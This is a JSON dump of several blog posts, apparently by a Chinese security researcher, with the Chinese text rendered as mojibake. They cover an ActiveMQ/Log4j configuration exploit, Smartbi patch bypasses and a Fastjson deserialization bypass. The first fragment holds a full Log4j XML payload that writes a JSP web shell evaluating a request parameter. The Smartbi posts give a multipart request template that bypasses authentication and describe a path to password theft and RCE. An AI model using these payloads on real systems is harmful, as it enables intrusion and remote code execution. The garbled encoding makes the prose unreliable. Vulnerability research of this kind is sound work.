ä½†æ˜¯å¿˜äº†ä¸€ç‚¹ï¼Œè¿™é‡Œè™½ç„¶è¾“å‡ºäº†payloadï¼Œä¹Ÿèƒ½åˆ©ç”¨äº†ä½†æ˜¯å¯¹äºæˆ‘ä»¬æå®¢æ¥è¯´ï¼Œä¸å–œæ¬¢é™¤äº†payloadçš„å…¶ä»–å­—ç¬¦ èƒ½åšåˆ°å—ï¼Ÿå½“ç„¶å¯ä»¥ï¼Œé€šè¿‡æŸ¥é˜…æ‰‹å†Œå¯ä»¥å‘ç°é’ˆå¯¹å †æ ˆä¿¡æ¯ï¼Œæœ‰ä¸‹é¢é…ç½® 1234%throwable&#123;full&#125;ï¼šè¾“å‡ºå®Œæ•´çš„å¼‚å¸¸å †æ ˆä¿¡æ¯%ex&#123;none&#125;æ¥ç¦ç”¨å¼‚å¸¸å †æ ˆçš„è¾“å‡º%ex&#123;short&#125;ï¼šè¾“å‡ºç®€çŸ­çš„å¼‚å¸¸å †æ ˆä¿¡æ¯ï¼ŒåªåŒ…æ‹¬å¼‚å¸¸ç±»å’Œæ¶ˆæ¯ã€‚%ex&#123;full&#125;ï¼šè¾“å‡ºå®Œæ•´çš„å¼‚å¸¸å †æ ˆä¿¡æ¯ï¼ŒåŒ…æ‹¬å¼‚å¸¸ç±»ã€æ¶ˆæ¯å’Œè¯¦ç»†çš„å †æ ˆè·Ÿè¸ªã€‚ é‚£ä¹ˆå¿…ç„¶æ˜¯é€‰%ex&#123;none&#125;ï¼Œå¾—åˆ°å¦‚ä¸‹payload 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt; &lt;Appenders&gt; &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot; filePattern=&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;&gt; &lt;PatternLayout pattern=&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;%ex&#123;none&#125;&quot;/&gt; &lt;Policies&gt; &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt; &lt;/Policies&gt; &lt;/RollingRandomAccessFile&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;INFO&quot;&gt; &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; å†ä¸€æ¬¡åˆ©ç”¨ä¸€å‘ï¼Œå°±æ˜¯è¿™ä¹ˆèˆ’çˆ½2333ï¼Œåˆ©ç”¨ä¹Ÿç®€å•åªéœ€è¦ä¸€å‘ä¿®æ”¹é…ç½®ã€è§¦å‘æ–‡ä»¶å†™å…¥","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"æµ…æSmartbié€»è¾‘æ¼æ´(2)","slug":"year/2023/8/æµ…æSmartbié€»è¾‘æ¼æ´-2","date":"2023-08-22T16:06:03.000Z","updated":"2024-08-04T09:01:49.926Z","comments":true,"path":"2023/08/23/year/2023/8/æµ…æSmartbié€»è¾‘æ¼æ´-2/","link":"","permalink":"https://y4tacker.github.io/2023/08/23/year/2023/8/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/","excerpt":"","text":"æµ…æSmartbié€»è¾‘æ¼æ´(2)å†™åœ¨å‰é¢ä»…åˆ†äº«é€»è¾‘æ¼æ´éƒ¨åˆ†è¡¥ä¸ç»•è¿‡æ€è·¯ï¼Œä¸æä¾›å®Œæ•´payload å‚å•†å·²å‘å¸ƒè¡¥ä¸ï¼šhttps://www.smartbi.com.cn/patchinfo æ­£æ–‡ç®€å•æä¸€ä¸‹ï¼Œè¡¥ä¸éƒ¨åˆ†ç”±smartbi.security.patch.PatchFilter(æ¥æºäºSecurityPatchExt.ext)åšåŠ è½½å¹¶å¤„ç†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨è¡¥ä¸è¿”å›çš„çŠ¶æ€ç çš„å…·ä½“å«ä¹‰å³å¯ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰è¿”å›0çš„æ—¶å€™ï¼Œfilteré“¾æ‰èƒ½ç»§ç»­é€šè¿‡doFilterç»§ç»­ä¼ é€’ 123456789101112131415161718Iterator var10 = rules.iterator();while(var10.hasNext()) &#123; URLPatchRule rule = (URLPatchRule)var10.next(); int result = rule.patch(uri, req, resp, chain); switch (result) &#123; case 0: default: break; case 1: resp.sendError(403); return; case 2: return; &#125;&#125;chain.doFilter(request, response); é¦–å…ˆæˆ‘ä»¬çœ‹çœ‹è€æ¿æœ¬å¯¹è¿™ç‚¹çš„patchçš„éƒ¨åˆ†ï¼Œå¦‚æœqueryStringä»¥windowUnloadingå¼€å¤´ï¼Œé‚£ä¹ˆä¼šåšä¸¤ä»¶äº‹ï¼Œé¦–å…ˆé€šè¿‡request.getParameterè·å–ClassNameä¸MethodNameçš„å€¼ï¼Œæ¥ç€å¯¹windowUnloadingä¸­çš„å€¼åšè§£ç å¹¶èµ‹å€¼ç»™urlClassNameä¸urlMethodNameå‚æ•°ï¼Œæœ€åè¡¥ä¸ä¸­ä¼šå¯¹request.getParameterä¸è§£ç çš„å€¼åšå¯¹æ¯”ï¼Œå¦‚æœå…¶ä¸­classnameä¸methodnameå€¼ä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›1ï¼Œä¹Ÿå°±æ˜¯åšæ‹¦æˆª 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public int patch(HttpServletRequest request, HttpServletResponse response, FilterChain chain) &#123; return this.assertQueryString(request); &#125;private int assertQueryString(HttpServletRequest request) &#123; String query = request.getQueryString(); if (StringUtil.isNullOrEmpty(query)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading&quot;)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading=&amp;&quot;) &amp;&amp; !query.startsWith(&quot;windowUnloading&amp;&quot;)) &#123; return 1; &#125; else &#123; String paramClassName = request.getParameter(&quot;className&quot;); String paramMethodName = request.getParameter(&quot;methodName&quot;); if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123; try &#123; String content = &quot;&quot;; String windowUnloadingStr = query.length() &gt; &quot;windowUnloading&quot;.length() &amp;&amp; query.charAt(&quot;windowUnloading&quot;.length()) == &#x27;=&#x27; ? &quot;windowUnloading=&amp;&quot; : &quot;windowUnloading&amp;&quot;; if (query.length() &gt; windowUnloadingStr.length()) &#123; content = query.substring(windowUnloadingStr.length()); if (content.endsWith(&quot;=&quot;)) &#123; content = content.substring(0, content.length() - 1); &#125; content = URLDecoder.decode(content, &quot;UTF-8&quot;); &#125; String urlClassName = &quot;&quot;; String urlMethodName = &quot;&quot;; if (content.indexOf(&quot;className=&quot;) == -1 &amp;&amp; content.indexOf(&quot;methodName=&quot;) == -1) &#123; String[] decode = RMICoder.decode(content); urlClassName = decode[0]; urlMethodName = decode[1]; &#125; else &#123; Map&lt;String, String&gt; map = HttpUtil.parseQueryString(content); urlClassName = (String)map.get(&quot;className&quot;); urlMethodName = (String)map.get(&quot;methodName&quot;); &#125; if (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123; return 0; &#125; else &#123; return paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? 0 : 1; &#125; &#125; catch (Exception var10) &#123; return 0; &#125; &#125; else &#123; return 0; &#125; &#125; é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ€è€ƒè¿™æ ·çš„æ–¹å¼çœŸçš„æœ‰æ•ˆä¹ˆï¼Ÿç­”æ¡ˆå½“æ—¶æ˜¯å¦ åœ¨ä¸Šç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å°±æåˆ°ï¼Œåœ¨CheckIsLoggedFilterä¸­å¦‚æœä¸è€ƒè™‘è§£ç æ“ä½œï¼Œå¯¹äºclassnameä¸methodnameçš„è·å–ï¼Œæœ‰ä¸‰ç§æ–¹å¼GET\\POST\\Multipart(è¿™é‡ŒPOSTæŒ‡æ ‡å‡†å½¢å¼é€šè¿‡Bodyä¼ å‚)ï¼Œè¡¥ä¸çš„æ“ä½œæ˜¯æ¯”å¯¹request.getParameteterä¸windowUnloadingè§£ç çš„å€¼æ˜¯å¦ä¸€è‡´ï¼Œæˆ‘æ›¾ç»ä¹Ÿåœ¨å…¶ä»–æ–‡ç« å½“ä¸­å†™åˆ°è¿‡ï¼Œåœ¨tomcatç¯å¢ƒä¸‹ï¼Œrequest.getParameteteråªèƒ½è·å–åˆ°GETä¸POSTï¼Œå¯¹äºMultiparté»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸åšæ”¯æŒçš„(éœ€è¦å•ç‹¬é…ç½®æ‰èƒ½å¼€å¯)ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿæ˜¯æ²¡é…ç½® æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡diffå‘ç°ï¼Œå¦‚æœcontent-typeå¤´ä»¥multipartå¼€å¤´å°±ä¼šè¿”å›çŠ¶æ€1ï¼Œä¹Ÿå°±æ˜¯æ‹¦æˆª åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šæˆ‘ä»¬å¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ å‡ºè¿™æ ·å½¢å¼çš„è¯·æ±‚åŒ…ï¼Œåƒä¹‹å‰é‚£æ ·é€šè¿‡windowUnloadingç»•è¿‡æ–¹æ³•æ ¡éªŒé™åˆ¶ 123456789101112131415161718POST /smartbi/vision/RMIServlet?windowUnloading=xxxx HTTP/1.1Host: xxxxContent-Type: multipart/form-data;charset=UTF-8;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwAConnection: close------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;className&quot;xxxService------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;methodName&quot;xxx------WebKitFormBoundaryrGKCBY7qhFd3TrwAContent-Disposition: form-data; name=&quot;params&quot;[&#x27;xxx&#x27;]------WebKitFormBoundaryrGKCBY7qhFd3TrwA æˆ‘ä»¬å°†çœŸæ­£è¦æ‰ç”¨çš„æ–¹æ³•æ”¾åœ¨multipartä¸­ï¼Œç”±äºæ­¤æ—¶request.getParameterå–å€¼ä¸ºnullï¼ŒStringUtil.isNullOrEmptyä¸ºtrueï¼Œè‡ªç„¶ä¹Ÿå°±ç»•è¿‡äº†è¡¥ä¸çš„é™åˆ¶ 12345678if (!query.startsWith(&quot;windowUnloading&quot;)) &#123; return 0; &#125; else if (!query.startsWith(&quot;windowUnloading=&amp;&quot;) &amp;&amp; !query.startsWith(&quot;windowUnloading&amp;&quot;)) &#123; return 1; &#125; else &#123; String paramClassName = request.getParameter(&quot;className&quot;); String paramMethodName = request.getParameter(&quot;methodName&quot;); if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123; æœ€ç»ˆåœ¨RMIServletè§£æå‚æ•°æ—¶ï¼Œåˆå•ç‹¬å¯¹multipartåšäº†å¤„ç†ï¼Œè¿™æ—¶æˆ‘ä»¬çœŸæ­£è¦æ‰ç”¨çš„æ¶æ„ç±»ä¸æ–¹æ³•åˆæˆåŠŸæ¢å¤å‡ºæ¥ï¼Œå®Œæˆäº†è€è¡¥ä¸çš„ç»•è¿‡ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125; &#125; å½“ç„¶è¿˜æœ‰äº›ä¸œè¥¿åªèƒ½è¯´ï¼Œæ‡‚å¾—éƒ½æ‡‚","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"æµ…æSmartbié€»è¾‘æ¼æ´","slug":"year/2023/7/æµ…æSmartbié€»è¾‘æ¼æ´","date":"2023-07-05T01:49:10.000Z","updated":"2024-08-04T09:01:49.912Z","comments":true,"path":"2023/07/05/year/2023/7/æµ…æSmartbié€»è¾‘æ¼æ´/","link":"","permalink":"https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"æµ…æSmartbié€»è¾‘æ¼æ´å†™åœ¨å‰é¢ä»…åˆ†äº«é€»è¾‘æ¼æ´éƒ¨åˆ†æ€è·¯ï¼Œå…¨æ–‡ä»¥æ— å®³è·¯ç”±åšæ¼”ç¤ºï¼Œåç»­åˆ©ç”¨éƒ¨åˆ†æ‰“ç å¤„ç† å‚å•†å·²å‘å¸ƒè¡¥ä¸ï¼šhttps://www.smartbi.com.cn/patchinfo åˆ†ææœ€è¿‘å¯ä»¥çœ‹åˆ°smartbiå®˜ç½‘çªç„¶å‘å¸ƒäº†æ–°çš„è¡¥ä¸ï¼Œå¯¹æ¯”å­¦ä¹ äº†ä¸‹ åˆ©ç”¨ä¹Ÿä»ç„¶å’ŒRMIServletç›¸å…³ï¼Œåœ¨è¿™ä¸ªServletä¸Šè¿˜æœ‰ä¸ªFilter(smartbi.freequery.filter.CheckIsLoggedFilter) å¦‚æœæˆ‘ä»¬è®¿é—®è°ƒç”¨ä¸€äº›æœªæˆæƒçš„ç±»æ–¹æ³•ï¼Œå°±ä¼šè¿”å›å¦‚ä¸‹å­—æ®µ æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¦‚æœæ­£å¸¸æƒ…å†µç¨‹åºè¯¥æ€ä¹ˆèµ°ï¼Œé¦–å…ˆå¦‚æœè°ƒç”¨RMIServletï¼Œåˆ™ä¼šå°è¯•è·å–åˆ°classNameä¸methodNameï¼Œè·å–çš„æ–¹å¼ä¹Ÿå¤šç§å¤šæ · æœ‰é€šè¿‡è§£ç windowUnloadingå‚æ•°è·å– æœ‰é€šè¿‡GET/POSTè·å– ç”šè‡³æ”¯æŒä»è¯·æ±‚ä½“æµä¸­è§£æ åé¢é€šè¿‡ä¸‹é¢è¿™ä¸¤ä¸ªåˆ¤æ–­å¯¹ç±»ä¸æ–¹æ³•åšé‰´æƒï¼Œå¦‚æœä¸ºtrueåˆ™ä¼šç»§ç»­åˆ¤æ–­æ˜¯å¦ç™»å½•ï¼Œæœªç™»å½•åˆ™æŠ›å‡ºCLIENT_USER_NOT_LOGIN è¿™é‡Œå¯¹äºæœªæˆæƒå³è¾¹éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥ä¸å¿…å…³å¿ƒï¼ŒæŒ‰ç…§è¿ç®—ç¬¦ä¼˜å…ˆçº§åªè¦FilterUtil.needToCheckè¿”å›falseé‚£ä¹ˆæ•´ä¸ªç»“æœä¸€å®šä¸ºfalseï¼Œè€ŒFilterUtil.needToCheckä¸­è¿”å›falseçš„éƒ½æ˜¯ç™½åå•ï¼Œä»£è¡¨æˆ‘ä»¬ä¸éœ€è¦ç™»å½•éƒ½èƒ½è®¿é—®ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šä¸ªç‰ˆæœ¬é€šè¿‡åˆ©ç”¨loginFromDBç™»å½•é»˜è®¤å†…ç½®ç”¨æˆ· æ¥ä¸‹æ¥è¿‡äº†è¿‡æ»¤å™¨éƒ¨åˆ†ï¼Œæˆ‘ä»¬åœ¨çœ‹RMIServletå¦‚ä½•å–å€¼ï¼Œé€šè¿‡parseRMIInfoä»requestå½“ä¸­å–å¾— åœ¨è¿™ä¸ªæ–¹æ³•ä¸­é¦–å…ˆé€šè¿‡request.getParameterå–å€¼ï¼Œè‹¥ä¸ºç©ºåˆ™é€šè¿‡multipartè·å–å‚æ•°ï¼Œå¦‚æœéƒ½ä¸è¡Œåˆ™é€šè¿‡request.getAttributeä»ä¹‹å‰ä¿å­˜çš„å±æ€§å½“ä¸­è·å– 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123; if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123; return null; &#125; else &#123; RMIInfo info = getRMIInfoFromRequest(request); if (info != null) &#123; return info; &#125; else &#123; String className = request.getParameter(&quot;className&quot;); String methodName = request.getParameter(&quot;methodName&quot;); String params = request.getParameter(&quot;params&quot;); if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123; DiskFileItemFactory dfif = new DiskFileItemFactory(); ServletFileUpload upload = new ServletFileUpload(dfif); String encodeString = null; try &#123; List&lt;FileItem&gt; fileItems = upload.parseRequest(request); request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems); Iterator var10 = fileItems.iterator(); while(var10.hasNext()) &#123; FileItem fileItem = (FileItem)var10.next(); if (fileItem.isFormField()) &#123; String itemName = fileItem.getFieldName(); String itemValue = fileItem.getString(&quot;UTF-8&quot;); if (&quot;className&quot;.equals(itemName)) &#123; className = itemValue; &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123; methodName = itemValue; &#125; else if (&quot;params&quot;.equals(itemName)) &#123; params = itemValue; &#125; else if (&quot;encode&quot;.equals(itemName)) &#123; encodeString = itemValue; &#125; &#125; &#125; &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123; LOG.error(var14.getMessage(), var14); &#125; if (!StringUtil.isNullOrEmpty(encodeString)) &#123; String[] decode = (String[])((String[])CodeEntry.decode(encodeString, true)); className = decode[0]; methodName = decode[1]; params = decode[2]; &#125; &#125; if (className == null &amp;&amp; methodName == null) &#123; className = (String)request.getAttribute(&quot;className&quot;); methodName = (String)request.getAttribute(&quot;methodName&quot;); params = (String)request.getAttribute(&quot;params&quot;); &#125; info = new RMIInfo(); info.setClassName(className); info.setMethodName(methodName); info.setParams(params); request.setAttribute(&quot;ATTR_KEY_RMIINFO&quot;, info); return info; &#125; &#125; &#125; åˆ©ç”¨è¿™æ—¶å€™ç¨å¾®å¯¹æ¼æ´æ•æ„Ÿçš„äººå·²ç»æ„è¯†åˆ°äº†ä¸€äº›é—®é¢˜ å‰é¢æåˆ°äº†æœ‰ä¸ªwindowUnloadingå‚æ•°ï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šå¯¹å€¼åšè§£ç ï¼Œå¹¶å°†ç»“æœèµ‹ç»™className/methodName/paramsï¼Œ é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±èƒ½é¦–å…ˆæ ¹æ®æ­¤å¯¹å‚æ•°åšæ±¡æŸ“ï¼Œè®©å…¶å¸®åŠ©æˆ‘ä»¬é€šè¿‡FilterUtil.needToCheckçš„æ ¡éªŒï¼Œä¹‹åç­‰åˆ°äº†RMIServletï¼Œåˆé€šè¿‡GET/POST/è¡¨å•å½“ä¸­çš„å€¼æ¢å¤çœŸå®è°ƒç”¨ å…³äºæ„é€ windowUnloadingï¼Œä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿æˆ‘é€‰æ‹©elseåˆ†æ”¯ï¼Œå› ä¸ºè¿™æ ·è¿”å›çš„å†…å®¹æ˜¯æ˜æ–‡ï¼Œçœå»ä¸€æ¬¡è§£ç çš„é—®é¢˜ å½“ç„¶é€‰æ‹©ä¸Šé¢è¿™ä¸ªifåˆ†æ”¯å…¶å®æ›´å¥½ï¼Œè¿™æ›´æ–¹ä¾¿æˆ‘ä»¬ä½¿æ”»å‡»æµé‡æ›´éšè”½ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥jsonpCallbackå‚æ•°å»é™¤è§£ç ï¼Œ å½“ç„¶ä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿æˆ‘è¿˜æ˜¯é€‰æ‹©elseåˆ†æ”¯ï¼Œä»»æ„é€‰æ‹©FilterUtil.needToCheckå½“ä¸­çš„ç±»æ–¹æ³• 1className=UserService&amp;methodName=checkVersion&amp;params=y4 ä¸‹é¢åšæ¼”ç¤ºï¼Œæœªä½¿ç”¨windowUnloadingå‰ï¼Œè°ƒç”¨å—é™æ–¹æ³•ä¼šæç¤ºæœªç™»å½•(è¿™é‡Œä»¥æ— å®³æ–¹æ³•åšæ¼”ç¤º) ä½¿ç”¨åæˆåŠŸè°ƒç”¨ é€šè¿‡æœªæˆæƒè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥è·å–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯åŒ…æ‹¬å¯†ç  é€šè¿‡ä¸Šç‰ˆæœ¬ä¸­æåˆ°çš„ç›´æ¥æ¯”å¯¹æ•°æ®åº“æ–¹å¼ç™»å½• æœ€ç»ˆå¯å®ç°RCEï¼Œå½“ç„¶RCEä¹Ÿä¸æ­¢è¿™ä¸€ç§ åè¯ä¸Šé¢æåˆ°å¯ä»¥é…åˆRMICoderç¼–è§£ç ä½¿æµé‡æ›´éšè”½ï¼ŒåŒæ ·ä»¥ç¬¬ä¸€ä¸ªæ— å®³æ–¹æ³•getSystemIdä¸ºä¾‹å­","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Smartbi","slug":"Smartbi","permalink":"https://y4tacker.github.io/tags/Smartbi/"}]},{"title":"FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ)","slug":"year/2023/4/FastJsonä¸åŸç”Ÿååºåˆ—åŒ–-äºŒ","date":"2023-04-26T01:43:49.000Z","updated":"2024-08-04T09:01:49.906Z","comments":true,"path":"2023/04/26/year/2023/4/FastJsonä¸åŸç”Ÿååºåˆ—åŒ–-äºŒ/","link":"","permalink":"https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/","excerpt":"","text":"FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ)å¾ˆæ—©ä¹‹å‰åœ¨å‘ç¬¬ä¸€ç¯‡çš„æ—¶å€™@jsjcwå¸ˆå‚…å°±æ›¾æåˆ°1.2.49åä¹Ÿèƒ½åˆ©ç”¨å¼•ç”¨ç»•è¿‡ï¼Œåé¢ç”±@1ueå¸ˆå‚…åœ¨çŸ¥è¯†æ˜Ÿçƒä¸­åˆ©ç”¨è¿™ä¸ªæ€è·¯æˆåŠŸç»•è¿‡å¹¶åˆ†äº«äº†payloadï¼Œè‡³æ­¤fastjsonå…¨ç‰ˆæœ¬å°±å½»åº•åŠ å…¥åŸç”Ÿååºåˆ—åŒ–çš„gadgetï¼Œå‘å¸ˆå‚…ä»¬è‡´æ•¬ï¼Œæƒ³ç€å°†æ–‡ç« å®Œå–„çš„ç¼˜æ•…ï¼Œå¹¶ä¸”å¸ˆå‚…ä»¬æ²¡æœ‰æåˆ°å…·ä½“çš„åŸç†ï¼Œå› æ­¤å‘ä¸ªç¬¬äºŒç¯‡è¿›è¡Œç®€å•ä»‹ç»ã€‚ å½“ç„¶è¿™é‡Œä¸ä¼šè¯¦ç»†è¯´æ˜å®Œæ•´çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå¦‚æœæœ‰æ„Ÿå…´è¶£çš„å¯ä»¥å‚è€ƒpandaå¸ˆå‚…çš„åšå®¢ï¼Œå…³äºåºåˆ—åŒ–æµç¨‹åˆ†ææ€»ç»“ä¸ååºåˆ—åŒ–æµç¨‹åˆ†ææ€»ç»“ï¼Œé‡Œé¢å·²ç»å†™çš„å¾ˆç»†è‡´äº†ã€‚ å›é¡¾ä¹‹å‰æåˆ°äº†ä»1.2.49å¼€å§‹ï¼Œæˆ‘ä»¬çš„JSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹çœŸæ­£æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³•ï¼Œ åœ¨å…¶SecureObjectInputStreamç±»å½“ä¸­é‡å†™äº†resolveClass,é€šè¿‡è°ƒç”¨äº†checkAutoTypeæ–¹æ³•åšç±»çš„æ£€æŸ¥ï¼Œè¿™æ ·çœŸçš„æ˜¯å®‰å…¨çš„ä¹ˆï¼Ÿ resolveClassçš„è°ƒç”¨ä¹ä¸€çœ‹ï¼Œè¿™æ ·çš„å†™æ³•å¾ˆå®‰å…¨ï¼Œå½“è°ƒç”¨JSONArray/JSONObjectçš„Objectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œå°†è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamå¤„ç†æ—¶ï¼Œè§¦å‘resolveClasså®ç°å¯¹æ¶æ„ç±»çš„æ‹¦æˆª è¿™æ—¶å€™ååºåˆ—åŒ–çš„è°ƒç”¨è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼Œå°±æ˜¯è¿™æ ·ä¸å®‰å…¨çš„ObjectInputStreamå¥—ä¸ªå®‰å…¨çš„SecureObjectInputStreamå¯¼è‡´äº†ç»•è¿‡ ä¸å®‰å…¨çš„ååºåˆ—åŒ–è¿‡ç¨‹123ObjectInputStream -&gt; readObjectxxxxxx(çœç•¥ä¸­é—´è¿‡ç¨‹)SecureObjectInputStream -&gt; readObject -&gt; resolveClass å®‰å…¨çš„ååºåˆ—åŒ–è¿‡ç¨‹å¤šæä¸€å˜´ï¼Œå¹³æ—¶æˆ‘ä»¬ä½œé˜²å¾¡åˆ™åº”è¯¥æ˜¯ç”Ÿæˆä¸€ä¸ªç»§æ‰¿ObjectInputStreamçš„ç±»å¹¶é‡å†™resolveClass(å‡å®šä¸ºTestInputStream)ï¼Œç”±å®ƒæ¥åšååºåˆ—åŒ–çš„å…¥å£ï¼Œè¿™æ ·æ‰æ˜¯å®‰å…¨çš„ï¼Œå› æ­¤å‹åŠ›å†æ¬¡ç»™åˆ°äº†å¼€å‘èº«ä¸Š 1TestInputStream -&gt; readObject -&gt; resolveClass ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬å°±éœ€è¦çœ‹çœ‹ä»€ä¹ˆæƒ…å†µä¸‹ä¸ä¼šè°ƒç”¨resolveClassï¼Œåœ¨java.io.ObjectInputStream#readObject0è°ƒç”¨ä¸­ï¼Œä¼šæ 